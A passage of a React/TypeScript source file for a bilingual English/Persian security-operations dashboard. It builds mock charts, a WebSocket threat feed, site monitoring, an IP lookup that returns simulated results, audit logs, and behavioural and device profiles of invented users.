import React, { useState } from "react";
import { useTranslation } from "react-i18next";
import {
  AreaChart,
  Area,
  LineChart,
  Line,
  PieChart,
  Pie,
  Cell,
  BarChart,
  Bar,
  ResponsiveContainer,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
} from "recharts";
import {
  ArrowUp,
  ArrowDown,
  ChevronDown,
  ChevronRight,
  Clock,
  ShieldAlert,
  ShieldCheck,
  Server,
  CloudLightning,
  Maximize2,
  MoreVertical,
  AlertTriangle,
  Plus,
  Shield,
  Globe,
  Trash2,
  Lock,
  Search,
  Check,
  Zap,
  Phone,
  Terminal,
  Cpu,
  Fingerprint,
  Sliders,
  Play,
  Copy,
  Settings,
  Activity,
  Flame,
  Network,
  Database,
  Radio,
  List,
  Users,
  Smartphone,
  Route,
  Book,
  Wrench,
  BarChart2,
} from "lucide-react";
import { cn } from "../lib/utils";
import { TrafficMap } from "./TrafficMap";

// --- MOCK DATA FOR CHARTS ---
const reqOverTimeData = Array.from({ length: 48 }).map((_, i) => ({
  time: i,
  val:
    5 +
    Math.random() * 5 +
    (i > 30 && i < 40 ? 4 : 0) +
    (i > 10 && i < 20 ? 8 : 0),
}));
const riskDistBarData = Array.from({ length: 30 }).map((_, i) => ({
  x: i,
  val: Math.exp(-Math.pow(i - 15, 2) / 20) * 100 + Math.random() * 10,
}));
const riskTimelineData = Array.from({ length: 96 }).map((_, i) => ({
  time: i,
  high: 10 + Math.random() * 5,
  medium: 30 + Math.random() * 10,
  low: 100 + Math.random() * 20 + (i > 60 ? 40 : 0),
}));

function StatCard({
  title,
  val,
  trendStr,
  isPos,
  icon: Icon,
  color,
  sparkData,
}: any) {
  return (
    <div className="bg-dash-panel border border-dash-border rounded-xl p-4 flex flex-col justify-between h-[110px] shadow-sm hover:shadow-md transition-all">
      <div className="flex justify-between items-start mb-2">
        <span className="text-[13px] font-medium text-slate-400">{title}</span>
        <div className="p-1.5 rounded-md bg-slate-800/50">
          <Icon className="w-3.5 h-3.5 text-slate-400" />
        </div>
      </div>
      <div className="flex items-end justify-between">
        <div>
          <div className="text-2xl font-bold text-white leading-none mb-1.5">
            {val}
          </div>
          <div
            className={cn(
              "text-[11px] font-medium flex items-center gap-0.5",
              isPos ? "text-emerald-500" : "text-rose-500"
            )}
          >
            {isPos ? (
              <ArrowUp className="w-3 h-3" />
            ) : (
              <ArrowDown className="w-3 h-3" />
            )}
            {trendStr}
          </div>
        </div>
        <div className="w-20 h-8 opacity-80">
          <ResponsiveContainer width="100%" height="100%">
            <LineChart data={sparkData}>
              <Line
                type="monotone"
                dataKey="val"
                stroke={color}
                strokeWidth={2}
                dot={false}
                isAnimationActive={false}
              />
            </LineChart>
          </ResponsiveContainer>
        </div>
      </div>
    </div>
  );
}

function SectionCard({ title, action, children, className }: any) {
  return (
    <div
      className={cn(
        "bg-dash-panel border border-dash-border rounded-xl flex flex-col",
        className
      )}
    >
      <div className="px-5 py-4 border-b border-dash-border/50 flex justify-between items-center shrink-0">
        <h3 className="text-[14px] font-semibold text-slate-200">{title}</h3>
        {action && <div className="text-xs">{action}</div>}
      </div>
      <div className="p-5 flex-1 relative overflow-hidden flex flex-col">
        {children}
      </div>
    </div>
  );
}

export default function Dashboard({
  activeTab = "overview",
  setActiveTab,
}: {
  activeTab?: string;
  setActiveTab?: (tab: string) => void;
}) {
  const { t, i18n } = useTranslation();
  const isRtl = i18n.language === "fa";

  // Spark data sets
  const [sparkG] = useState(Array.from({ length: 10 }).map(() => ({ val: Math.random() })));
  const [sparkR] = useState(Array.from({ length: 10 }).map(() => ({ val: Math.random() })));
  const [sparkY] = useState(Array.from({ length: 10 }).map(() => ({ val: Math.random() })));

  // --- SUBVIEW: LIVE THREAT FEED WEBSOCKET ---
  const [liveEvents, setLiveEvents] = useState<any[]>([]);
  const [wsStatus, setWsStatus] = useState<"connecting" | "connected" | "disconnected">("connecting");
  const [isStreamPaused, setIsStreamPaused] = useState(false);
  const pausedRef = React.useRef(false);

  React.useEffect(() => {
    pausedRef.current = isStreamPaused;
  }, [isStreamPaused]);

  React.useEffect(() => {
    let socket: WebSocket | null = null;
    let reconnectTimeoutId: any = null;
    let isMounted = true;

    function connect() {
      if (!isMounted) return;
      setWsStatus("connecting");
      
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws';
      const wsUrl = `${protocol}//${window.location.host}`;
      
      console.log(`[WebSocket] Connecting to: ${wsUrl}`);
      try {
        socket = new WebSocket(wsUrl);

        socket.onopen = () => {
          if (!isMounted) return;
          setWsStatus("connected");
          console.log('[WebSocket] Live Threat Feed connection established');
        };

        socket.onmessage = (eventMsg) => {
          if (!isMounted) return;
          try {
            const payload = JSON.parse(eventMsg.data);
            if (payload.type === 'INIT') {
              setLiveEvents(payload.data);
            } else if (payload.type === 'EVENT') {
              if (pausedRef.current) return;
              setLiveEvents((prev) => {
                const isDuplicate = prev.some((e) => e.id === payload.data.id);
                if (isDuplicate) return prev;
                const updated = [payload.data, ...prev];
                if (updated.length > 50) {
                  updated.pop();
                }
                return updated;
              });
            }
          } catch (err) {
            console.error('[WebSocket] JSON parse error', err);
          }
        };

        socket.onerror = (err) => {
          console.error('[WebSocket] Error state on stream', err);
        };

        socket.onclose = () => {
          if (!isMounted) return;
          setWsStatus("disconnected");
          console.log('[WebSocket] Offline. Resetting stream socket in 5s...');
          reconnectTimeoutId = setTimeout(connect, 5000);
        };
      } catch (e) {
        console.error('[WebSocket] Setup exception triggered', e);
        if (isMounted) {
          reconnectTimeoutId = setTimeout(connect, 5000);
        }
      }
    }

    connect();

    // Trigger state change tick to refresh relative text every 4 seconds
    const intervalId = setInterval(() => {
      if (isMounted) {
        setLiveEvents((prev) => [...prev]);
      }
    }, 4000);

    return () => {
      isMounted = false;
      if (socket) {
        socket.close();
      }
      if (reconnectTimeoutId) {
        clearTimeout(reconnectTimeoutId);
      }
      clearInterval(intervalId);
    };
  }, []);

  const getRelativeTime = (timestamp: string) => {
    const diffMs = Date.now() - new Date(timestamp).getTime();
    const diffSec = Math.max(0, Math.floor(diffMs / 1000));
    if (diffSec < 5) return isRtl ? "همین الان" : "Just now";
    if (diffSec < 60) return isRtl ? `${diffSec} ثانیه قبل` : `${diffSec} sec ago`;
    const diffMin = Math.floor(diffSec / 60);
    if (diffMin < 60) return isRtl ? `${diffMin} دقیقه قبل` : `${diffMin} min ago`;
    return isRtl ? "بیش از ۱ ساعت قبل" : "Over 1 hr ago";
  };

  // --- SUBVIEW 1: RISK ENGINE CONFIGURATIONS ---
  const [browserFingerprintCoeff, setBrowserFingerprintCoeff] = useState(75);
  const [ipReputationCoeff, setIpReputationCoeff] = useState(85);
  const [behaviorEntropyCoeff, setBehaviorEntropyCoeff] = useState(60);
  const [networkLatencyCoeff, setNetworkLatencyCoeff] = useState(40);
  const [riskSuccessMsg, setRiskSuccessMsg] = useState("");

  const handleSaveRiskCoeffs = () => {
    setRiskSuccessMsg(isRtl ? "پارامترهای موتور ریسک با موفقیت همگام‌سازی شدند" : "Risk engine parameters synchronized successfully");
    setTimeout(() => setRiskSuccessMsg(""), 3000);
  };

  // --- SUBVIEW 2: IP INTELLIGENCE SEARCH ---
  const [ipInput, setIpInput] = useState("185.220.101.23");
  const [ipResults, setIpResults] = useState<any>({
    ip: "185.220.101.23",
    country: "🇫🇮 Finland",
    isp: "Mullvad VPN",
    risk: 92,
    type: "VPN Exit • Tor Node Verified",
    status: "blocked",
  });
  const [ipSuccessMsg, setIpSuccessMsg] = useState("");

  // --- SUBVIEW: DYNAMIC MONITORED WEBSITES STATE ---
  const [monitoredWebsites, setMonitoredWebsites] = useState<any[]>(() => {
    const cached = localStorage.getItem("cybershield_monitored_sites");
    if (cached) {
      try {
        return JSON.parse(cached);
      } catch (e) {
        // Fallback below
      }
    }
    return [
      {
        id: "site-1",
        domain: "mullvad.net",
        registrar: "Gandi SAS",
        ssl: "Let's Encrypt (RSA 2048)",
        status: "ACTIVE & SECURED",
        latency: 42,
        dnsA: "185.220.101.23",
        dnsMx: "10 mail.mullvad.net",
        dnsSpf: "v=spf1 include:_spf.mullvad.net -all",
        dnsDmarc: "v=DMARC1; p=reject; pct=100;...",
        wafEnabled: true,
        ddosEnabled: true,
        dnssecEnabled: true,
        sslEnforced: true,
        createdAt: "2026-05-30T10:00:00Z"
      }
    ];
  });
  const [selectedSiteId, setSelectedSiteId] = useState<string>("site-1");
  const [newSiteDomain, setNewSiteDomain] = useState("");
  const [newSiteRegistrar, setNewSiteRegistrar] = useState("");
  const [newSiteSsl, setNewSiteSsl] = useState("");
  const [newSiteA, setNewSiteA] = useState("");
  const [newSiteStatus, setNewSiteStatus] = useState("ACTIVE & SECURED");
  const [newSiteError, setNewSiteError] = useState("");
  const [isAddingSite, setIsAddingSite] = useState(false);

  React.useEffect(() => {
    localStorage.setItem("cybershield_monitored_sites", JSON.stringify(monitoredWebsites));
  }, [monitoredWebsites]);

  React.useEffect(() => {
    const interval = setInterval(() => {
      setMonitoredWebsites(prev => 
        prev.map(s => {
          if (s.status === "ACTIVE & SECURED") {
            const delta = Math.floor((Math.random() - 0.5) * 6);
            return { ...s, latency: Math.max(10, Math.min(150, s.latency + delta)) };
          } else if (s.status === "UNDER_ATTACK") {
            const delta = Math.floor((Math.random() - 0.5) * 20);
            return { ...s, latency: Math.max(200, Math.min(600, s.latency + delta)) };
          } else {
            return { ...s, latency: 0 };
          }
        })
      );
    }, 4000);
    return () => clearInterval(interval);
  }, []);

  const handleAddWebsite = (e: React.FormEvent) => {
    e.preventDefault();
    setNewSiteError("");
    if (!newSiteDomain.trim()) {
      setNewSiteError(isRtl ? "وارد کردن نام دامنه الزامی است" : "Domain name is required");
      return;
    }
    const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+$/;
    if (!domainRegex.test(newSiteDomain.trim())) {
      setNewSiteError(isRtl ? "فرمت نام دامنه اشتباه است (مانند: site.ir)" : "Invalid domain format (e.g., site.com)");
      return;
    }

    const domainNameExists = monitoredWebsites.some(s => s.domain.toLowerCase() === newSiteDomain.trim().toLowerCase());
    if (domainNameExists) {
      setNewSiteError(isRtl ? "این وب‌سایت فایروال از قبل پایش می‌شود" : "This domain is already registered for prying eyes");
      return;
    }

    const domain = newSiteDomain.trim().toLowerCase();
    const newId = "site-" + Date.now();
    const newSite = {
      id: newId,
      domain,
      registrar: newSiteRegistrar.trim() || (isRtl ? "ثبت‌کننده ابری کلودفر" : "Cloudflare Inc."),
      ssl: newSiteSsl.trim() || "Let's Encrypt (RSA 2048)",
      status: newSiteStatus,
      latency: newSiteStatus === "ACTIVE & SECURED" ? Math.floor(25 + Math.random() * 30) : (newSiteStatus === "UNDER_ATTACK" ? 342 : 0),
      dnsA: newSiteA.trim() || ("13.232." + Math.floor(Math.random() * 254) + "." + Math.floor(Math.random() * 254)),
      dnsMx: "10 mail." + domain,
      dnsSpf: "v=spf1 include:_spf." + domain + " -all",
      dnsDmarc: "v=DMARC1; p=quarantine; pct=100;...",
      wafEnabled: true,
      ddosEnabled: true,
      dnssecEnabled: false,
      sslEnforced: true,
      createdAt: new Date().toISOString()
    };

    const updatedWebsites = [...monitoredWebsites, newSite];
    setMonitoredWebsites(updatedWebsites);
    setSelectedSiteId(newId);

    // Reset Form fields
    setNewSiteDomain("");
    setNewSiteRegistrar("");
    setNewSiteSsl("");
    setNewSiteA("");
    setNewSiteStatus("ACTIVE & SECURED");
    setIsAddingSite(false);

    // Add Audit Log Entry
    const logItem = {
      id: "l-site-" + Date.now(),
      time: new Date().toISOString().substring(11, 19),
      type: "INFO",
      text: `SITE_MONITOR: Added domain "${domain}" to active security analytics watch.`,
      color: "text-emerald-400 font-semibold"
    };
    setAuditLogsList(prev => [logItem, ...prev]);

    // Success response ticker
    setIpSuccessMsg(isRtl ? `وب‌سایت ${domain} با موفقیت به پلتفرم نظارتی اضافه شد` : `Website ${domain} successfully linked to control center`);
    setTimeout(() => setIpSuccessMsg(""), 3500);
  };

  const toggleSiteFlag = (siteId: string, flag: "wafEnabled" | "ddosEnabled" | "dnssecEnabled" | "sslEnforced") => {
    setMonitoredWebsites(prev => 
      prev.map(s => {
        if (s.id === siteId) {
          const nextVal = !s[flag];
          
          // Log Audit Action
          const logItem = {
            id: "l-site-flag-" + Date.now(),
            time: new Date().toISOString().substring(11, 19),
            type: "WARNING",
            text: `SECURITY_RULES: Monitored target "${s.domain}" security rule [${flag}] changed to ${nextVal.toString().toUpperCase()}`,
            color: "text-amber-400 font-semibold"
          };
          setAuditLogsList(prevLogs => [logItem, ...prevLogs]);

          return { ...s, [flag]: nextVal };
        }
        return s;
      })
    );
  };

  const setSiteStatus = (siteId: string, nextStatus: string) => {
    setMonitoredWebsites(prev => 
      prev.map(s => {
        if (s.id === siteId) {
          // Log Action
          const logItem = {
            id: "l-site-state-" + Date.now(),
            time: new Date().toISOString().substring(11, 19),
            type: nextStatus === "UNDER_ATTACK" ? "SEVERE" : (nextStatus === "OFFLINE" ? "SEVERE" : "INFO"),
            text: `SITE_STATE: Target "${s.domain}" status altered to [${nextStatus}]`,
            color: nextStatus === "UNDER_ATTACK" ? "text-rose-500 font-bold animate-pulse" : "text-emerald-400 font-bold"
          };
          setAuditLogsList(prevLogs => [logItem, ...prevLogs]);

          return { ...s, status: nextStatus };
        }
        return s;
      })
    );
  };

  const deleteSite = (siteId: string, name: string) => {
    if (siteId === "site-1") {
      alert(isRtl ? "شما نمی‌توانید پایگاه اصلی نظارتی را حذف کنید!" : "Core monitoring node cannot be deleted!");
      return;
    }
    setMonitoredWebsites(prev => prev.filter(s => s.id !== siteId));
    setSelectedSiteId("site-1");

    const logItem = {
      id: "l-site-del-" + Date.now(),
      time: new Date().toISOString().substring(11, 19),
      type: "WARNING",
      text: `SITE_MONITOR: Target "${name}" removed from security watch list`,
      color: "text-rose-400 font-medium"
    };
    setAuditLogsList(prev => [logItem, ...prev]);

    setIpSuccessMsg(isRtl ? "وب‌سایت با موفقیت از پایش حذف شد" : "Website detached from monitoring panel");
    setTimeout(() => setIpSuccessMsg(""), 3000);
  };

  const handleIpSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (!ipInput.trim()) return;
    
    // Simulating scanning
    setIpSuccessMsg(isRtl ? "در حال دریافت سیگنال از تهدیدات فایروال..." : "Fetching firewall signals...");
    setTimeout(() => {
      setIpSuccessMsg("");
      const isRisky = Math.random() > 0.4;
      setIpResults({
        ip: ipInput,
        country: isRisky ? "🇳🇱 Netherlands" : "🇺🇸 United States",
        isp: isRisky ? "TOR Cloud Network" : "Google Cloud Provider",
        risk: isRisky ? Math.floor(70 + Math.random() * 29) : Math.floor(10 + Math.random() * 20),
        type: isRisky ? "Malicious VPN Exit Node" : "Clean Commercial Network",
        status: isRisky ? "blocked" : "active",
      });
    }, 800);
  };

  const handleToggleIpStatus = () => {
    const nextStatus = ipResults.status === "blocked" ? "active" : "blocked";
    setIpResults({ ...ipResults, status: nextStatus });
    setIpSuccessMsg(
      isRtl 
        ? `وضعیت دسترسی آدرس با موفقیت تغییر یافت` 
        : `Access state of target modified successfully`
    );
    setTimeout(() => setIpSuccessMsg(""), 3000);
  };

  // --- SUBVIEW: DATA & EVENTS TABS SUPPORT ---
  const [liveEventFilter, setLiveEventFilter] = useState("all");
  const [explorerSearch, setExplorerSearch] = useState("");
  const [explorerCategory, setExplorerCategory] = useState("all");
  const [selectedExplorerEvent, setSelectedExplorerEvent] = useState<any>(null);

  const [streamSuccessMsg, setStreamSuccessMsg] = useState("");
  const [streamConnectors, setStreamConnectors] = useState([
    { id: "c1", name: "Splunk Enterprise Sockets Link", host: "splunk-forwarder.internal:9997", enabled: true, format: "JSON", rate: "12.4 KB/s" },
    { id: "c2", name: "AWS CloudWatch Agents Gateway", host: "syslog-receiver.eu-west-1.aws:514", enabled: true, format: "Syslog", rate: "4.8 KB/s" },
    { id: "c3", name: "Datadog Security Event Ingest", host: "http-intake.logs.datadoghq.com/api/v2", enabled: false, format: "JSON", rate: "0.0 KB/s" },
    { id: "c4", name: "Apache Kafka Threat Broker Cluster", host: "kafka-bootstrap.prod-dash-vpc:9092", enabled: true, format: "Protobuf", rate: "18.2 KB/s" },
  ]);

  const [streamThroughputData, setStreamThroughputData] = useState(
    Array.from({ length: 15 }).map((_, i) => ({
      sec: 15 - i,
      rate: 20 + Math.random() * 20
    }))
  );

  React.useEffect(() => {
    const timer = setInterval(() => {
      setStreamThroughputData((prev) => {
        const next = [...prev.slice(1), { sec: 0, rate: 20 + Math.random() * 20 }];
        return next.map((item, idx) => ({ ...item, sec: 15 - idx }));
      });
    }, 2000);
    return () => clearInterval(timer);
  }, []);

  const [auditLogsSearch, setAuditLogsSearch] = useState("");
  const [customAuditNote, setCustomAuditNote] = useState("");
  const [auditLogsList, setAuditLogsList] = useState<any[]>(() => {
    const cached = localStorage.getItem("system_audit_logs");
    if (cached) {
      try {
        return JSON.parse(cached);
      } catch (e) {
        // Fallback to defaults
      }
    }
    return [
      { id: "l1", time: "2026-05-30 10:03:09", type: "SYSTEM", text: "SYSTEM_STARTUP: FIDO2 Encryption provider matched correctly.", color: "text-emerald-500" },
      { id: "l2", time: "2026-05-30 10:03:12", type: "INFO", text: "POLICY_INFO: impossible coordinate tolerance weights synced to 40%.", color: "text-slate-500" },
      { id: "l3", time: "2026-05-30 10:03:25", type: "INFO", text: "FIDO2_OK: cryptographic key register signature validated.", color: "text-slate-500" },
      { id: "l4", time: "2026-05-30 10:03:44", type: "SEVERE", text: "FIREWALL_DENY: Malicious VPN Exit IP 185.220.101.23 requested admin socket access. Session Drop.", color: "text-rose-500 font-bold" },
      { id: "l5", time: "2026-05-30 10:04:12", type: "WARNING", text: "WEBAUTHN_CHALLENGE: Generating biometric challenges pattern for John Smith.", color: "text-amber-500 font-bold" },
      { id: "l6", time: "2026-05-30 10:04:15", type: "INFO", text: "SESSION_RESTORE: John Smith successfully logged into terminal. Identity matches.", color: "text-slate-300 font-semibold" },
      { id: "l7", time: "2026-05-30 10:04:30", type: "INFO", text: "AUDIT: API Key generated for \"Incident Response Webhook Token\".", color: "text-slate-500" },
      { id: "l8", time: "2026-05-30 10:05:01", type: "WARNING", text: "WEBAUTHN_WARN: Biometric match failed margin by 0.2% on VPN IP 79.125.15.100. Verification holds.", color: "text-rose-500 font-bold" },
      { id: "l9", time: "2026-05-30 10:05:32", type: "INFO", text: "WEBAUTHN_OK: Fingerprint signature matches 99.8% on encrypted hash file.", color: "text-emerald-500 font-bold" },
      { id: "l10", time: "2026-05-30 10:05:35", type: "INFO", text: "WEBAUTHN_STATE_APPROVED: Clearance Level 3 successfully added to session admin-310b.", color: "text-indigo-400" },
    ];
  });

  React.useEffect(() => {
    localStorage.setItem("system_audit_logs", JSON.stringify(auditLogsList));
  }, [auditLogsList]);

  const [historicEvents] = useState([
    { id: "e1", ip: "185.220.101.23", clocEn: "Finland • VPN", clocFa: "فنلاند • وی‌پی‌ان", flag: "🇫🇮", rScore: 92, typeEn: "Tor Exit Node Verified", typeFa: "نود خروجی Tor", host: "tor-exit-nord.helsinki.fi", time: "2026-05-30 10:42:11", action: "Blocked & Flagged" },
    { id: "e2", ip: "45.133.22.15", clocEn: "United States", clocFa: "ایالات متحده", flag: "🇺🇸", rScore: 68, typeEn: "Suspicious API Ingress", typeFa: "آی‌پی مشکوک", host: "c-45-133-22-15.comcast.net", time: "2026-05-30 10:41:05", action: "Challenged" },
    { id: "e3", ip: "79.125.15.100", clocEn: "Netherlands • TOR", clocFa: "هلند • تور", flag: "🇳🇱", rScore: 95, typeEn: "Credential Stuffing Pattern", typeFa: "تلاش برای حدس کلمه عبور", host: "tor.node-amsterdam.nl", time: "2026-05-30 10:39:55", action: "Blocked" },
    { id: "e4", ip: "193.34.78.90", clocEn: "Germany", clocFa: "آلمان", flag: "🇩🇪", rScore: 21, typeEn: "Clean Residential Network", typeFa: "سوابق پاک مسکونی", host: "dsl-120-78-90.telekom.de", time: "2026-05-30 10:38:12", action: "Allowed" },
    { id: "e5", ip: "5.188.210.45", clocEn: "Russia • Anonymous Proxy", clocFa: "روسیه • پروکسی ناشناس", flag: "🇷🇺", rScore: 89, typeEn: "DDoS Reflection Node", typeFa: "نشانه بات تهاجمی DDoS", host: "host-5-188-210-45.ru", time: "2026-05-30 10:35:48", action: "Blocked & Blacklisted" },
    { id: "e6", ip: "119.23.44.112", clocEn: "China • Botnet Node", clocFa: "چین • گره بات‌نت", flag: "🇨🇳", rScore: 78, typeEn: "Mirai Botnet Scanner", typeFa: "فعالیت مخرب فایروال", host: "adsl.sz.gd.chinanet.cn", time: "2026-05-30 10:34:00", action: "Blocked" },
    { id: "e7", ip: "13.233.15.220", clocEn: "Singapore", clocFa: "سنگاپور", flag: "🇸🇬", rScore: 12, typeEn: "AWS Cloud Ingress", typeFa: "آی‌پی گیت‌وی", host: "ec2-13-233-15-220.ap-south-1.compute.amazonaws.com", time: "2026-05-30 10:30:15", action: "Allowed" },
    { id: "e8", ip: "192.178.2.11", clocEn: "United Kingdom", clocFa: "بریتانیا", flag: "🇬🇧", rScore: 45, typeEn: "High Velocity Activity", typeFa: "عملیات نامتقارن با لتنسی", host: "host-192-178-2-11.bt.com", time: "2026-05-30 10:29:02", action: "Challenged" },
  ]);

  // --- SUBVIEW 3: SESSIONS SECURITY ---
  const [sessionList, setSessionList] = useState([
    { id: "s1", user: "John Smith", avatar: "https://i.pravatar.cc/150?u=john", os: "macOS • Chrome", ip: "103.24.11.192", role: "Super Admin", trust: 98 },
    { id: "s2", user: "Sarvin Maleki", avatar: "https://i.pravatar.cc/150?u=sarvin", os: "Linux • Firefox", ip: "185.220.101.23", role: "Security Analyst", trust: 64 },
    { id: "s3", user: "Dev Ops Daemon", avatar: "https://i.pravatar.cc/150?u=dev", os: "AWS Node • Python", ip: "3.95.12.8", role: "Automation Bot", trust: 92 },
  ]);
  const [sessionSuccessMsg, setSessionSuccessMsg] = useState("");

  // --- SUBVIEW: ADVANCED BEHAVIORAL ANALYTICS ---
  const [behaviorMsg, setBehaviorMsg] = useState("");
  const [selectedBehavioralUser, setSelectedBehavioralUser] = useState("b2");
  const [behavioralUsers, setBehavioralUsers] = useState([
    {
      id: "b1",
      user: "John Smith",
      role: "Super Admin",
      avatar: "https://i.pravatar.cc/150?u=john",
      typingSpeed: "180 CPM (Medium)",
      keystrokeFlightTime: 120,
      mouseJitter: "Low / Steady",
      mouseEntropy: 1.45,
      timeAnomaly: "None",
      riskScore: 12,
      status: "PASS",
      statusFa: "پاک / عادی",
      keystrokeData: [
        { name: "k1", val: 110 }, { name: "k2", val: 130 }, { name: "k3", val: 125 }, { name: "k4", val: 115 }, { name: "k5", val: 120 }
      ]
    },
    {
      id: "b2",
      user: "Sarvin Maleki",
      role: "Security Analyst",
      avatar: "https://i.pravatar.cc/150?u=sarvin",
      typingSpeed: "380 CPM (Fast-Paced)",
      keystrokeFlightTime: 65,
      mouseJitter: "High Jitter (Anxious)",
      mouseEntropy: 2.89,
      timeAnomaly: "Unusual Night Activity",
      riskScore: 68,
      status: "SUSPICIOUS",
      statusFa: "مشکوک",
      keystrokeData: [
        { name: "k1", val: 70 }, { name: "k2", val: 60 }, { name: "k3", val: 80 }, { name: "k4", val: 50 }, { name: "k5", val: 65 }
      ]
    },
    {
      id: "b3",
      user: "Dev Ops Daemon",
      role: "Automation Bot",
      avatar: "https://i.pravatar.cc/150?u=dev",
      typingSpeed: "Static Buffer Transmit",
      keystrokeFlightTime: 2,
      mouseJitter: "None / Robotic Flatline",
      mouseEntropy: 0.12,
      timeAnomaly: "Repetitive Millisecond Loops",
      riskScore: 94,
      status: "SEVERE ALERT",
      statusFa: "بحرانی / ربات",
      keystrokeData: [
        { name: "k1", val: 2 }, { name: "k2", val: 3 }, { name: "k3", val: 1 }, { name: "k4", val: 2 }, { name: "k5", val: 2 }
      ]
    }
  ]);

  // --- SUBVIEW: DEVICE FINGERPRINTS ---
  const [deviceSuccessMsg, setDeviceSuccessMsg] = useState("");
  const [deviceFingerprintsList, setDeviceFingerprintsList] = useState([
    {
      id: "df1",
      owner: "John Smith",
      deviceModel: "MacBook Pro 16-inch M3",
      os: "macOS Sierra 15.0 (Sequoia)",
      browser: "Google Chrome v124.0",
      canvasHash: "0xFA417BDB8",
      webGlRenderer: "Apple M3 GPU Pipeline",
      audioHash: "0x89E1AD90",
      screenResolution: "3456 x 2234 PX",
      timezoneCountry: "US / California MST",
      confidence: "99.8%",
      trusted: "Trusted Device",
      trustedFa: "مورد اعتماد",
      riskScore: 4,
    },
    {
      id: "df2",
      owner: "Sarvin Maleki",
      deviceModel: "ThinkPad X1 Extreme Gen 6",
      os: "Ubuntu 24.04 LTS (Noble)",
      browser: "Mozilla Firefox v126.4",
      canvasHash: "0x12b5ad33cfd1",
      webGlRenderer: "Intel Iris Xe Integrated",
      audioHash: "0xffae3415",
      screenResolution: "1920 x 1200 PX",
      timezoneCountry: "DE / Frankfurt GMT+1",
      confidence: "88.5%",
      trusted: "Unverified Device",
      trustedFa: "بررسی نشده",
      riskScore: 48,
    },
    {
      id: "df3",
      owner: "Unknown Gateway Ingress",
      deviceModel: "Server virtualization frame",
      os: "Debian Linux v12 (Headless)",
      browser: "Puppeteer / Chromium Bot",
      canvasHash: "0x99AAD77BF0",
      webGlRenderer: "SwiftShader Generic Software",
      audioHash: "0x00000000 (Stubbed)",
      screenResolution: "1024 x 768 PX",
      timezoneCountry: "FI / TOR Exit Node",
      confidence: "14.2%",
      trusted: "Flagged & Blocked",
      trustedFa: "نامعتبر و مسدود",
      riskScore: 92,
    }
  ]);

  // --- SUBVIEW: USER JOURNEYS TIMELINES ---
  const [journeySuccessMsg, setJourneySuccessMsg] = useState("");
  const [selectedJourneyUser, setSelectedJourneyUser] = useState("uj1");
  const [userJourneysList, setUserJourneysList] = useState([
    {
      id: "uj1",
      user: "John Smith",
      role: "Super Admin",
      avatar: "https://i.pravatar.cc/150?u=john",
      ip: "103.24.11.192",
      active: true,
      timeSummary: "3 mins active",
      riskIndex: 8,
      steps: [
        { action: "Inbound Connection Decrypted", actionFa: "رمزگشایی بسته ورودی", desc: "TLSv1.3 tunnel established with certificate verification", descFa: "تونل TLSv1.3 با تایید گواهینامه معتبر مبدا برقرار شد", time: "11:21:05", type: "INFO", status: "APPROVED", statusFa: "تایید شده" },
        { action: "FIDO2 Resident Key Handshake", actionFa: "احرازهویت سخت‌افزاری FIDO2", desc: "YubiKey biometric challenge succeeded with 99.9% match", descFa: "چالش کلید بیومتریک امن سخت‌افزاری با ۹۹.۹٪ امتیاز تایید شد", time: "11:21:40", type: "SUCCESS", status: "APPROVED", statusFa: "تایید شده" },
        { action: "Session Assigned Level 3", actionFa: "تخصیص سطح دسترسی ۳", desc: "Clearence level 3 granted. Active token linked to browser canvas footprint", descFa: "دسترسی لول ۳ اعطا شد. سشن به آیدی بومی مرورگر قفل گردید", time: "11:21:42", type: "SUCCESS", status: "APPROVED", statusFa: "تایید شده" },
        { action: "Accessing Firewalls Database", actionFa: "دسترسی به پایگاه داده قوانین", desc: "Read-write query performed on core firewalls configuration store", descFa: "پرس‌وجو (Query) بر روی جدول قوانین امنیتی با موفقیت ثبت شد", time: "11:24:12", type: "WARN", status: "SENSITIVE_CHALLENGED", statusFa: "نیاز به الگو ثانویه" }
      ]
    },
    {
      id: "uj2",
      user: "Sarvin Maleki",
      role: "Security Analyst",
      avatar: "https://i.pravatar.cc/150?u=sarvin",
      ip: "185.220.101.23",
      active: true,
      timeSummary: "24 mins active",
      riskIndex: 56,
      steps: [
        { action: "Anonymous Route Registered", actionFa: "شناسایی مسیر ترافیک ناشناس", desc: "IP flagged as commercial NordVPN endpoint. Challenged standard telemetry", descFa: "آدرس آی‌پی متعلق به سرور VPN شناسایی گردید و چالش ترافیکی فعال شد", time: "11:02:10", type: "WARN", status: "MONITORED", "statusFa": "تحت نظارت" },
        { action: "WebAuthn Pattern Challenge", actionFa: "چالش الگوهای مرورگر", desc: "Additional biometric patterns verified with thin margins", descFa: "چالش الگوهای بیومتریک فایروال با ضریب خطای مجاز دریافت گردید", time: "11:04:33", type: "INFO", status: "CHALLENGING", "statusFa": "در حال چالش" },
        { action: "Querying Audit Logs Database", actionFa: "درخواست دریافت آرشیو لاگ‌ها", desc: "Requested export format: CSV. Size exceeded normal analyst baseline for the week", descFa: "درخواست اکسپورت CSV ثبت شده از متوسط رفتار کاربر بالاتر است", "time": "11:18:15", type: "SEVERE", status: "BLOCKED_ON_WAIT_STATE", "statusFa": "تعلیق موقت" }
      ]
    },
    {
      id: "uj3",
      user: "Dev Ops Daemon",
      role: "Automation Bot",
      avatar: "https://i.pravatar.cc/150?u=dev",
      ip: "3.95.12.8",
      active: false,
      timeSummary: "Stopped 10 mins ago",
      riskIndex: 94,
      steps: [
        { action: "Scanning Admin Login Gate", actionFa: "اسکن پورت ادمین", desc: "Rapid raw HTTP requests targeted to /api/auth/sign-in with zero delay", descFa: "ارسال پشت سر هم و بسیار سریع ۲۴۰ درخواست بدون وقفه به وب‌هویک ورود", time: "10:50:00", type: "SEVERE", status: "FLAGGED", "statusFa": "نشان‌شده" },
        { action: "Keystroke Timing Fraud Detection", actionFa: "تشخیص تقلب سرعت تایپ", desc: "Input variables filled instantly in perfect 0.0ms flight time. Bot confirmed", descFa: "داده‌های فرم با تاخیر ثابت 0ms پر شدند. بات‌نت قطعاً تایید گردید", time: "10:50:01", type: "SEVERE", status: "AUTOMATICALLY_BLOCKED", "statusFa": "مسدود خودکار" },
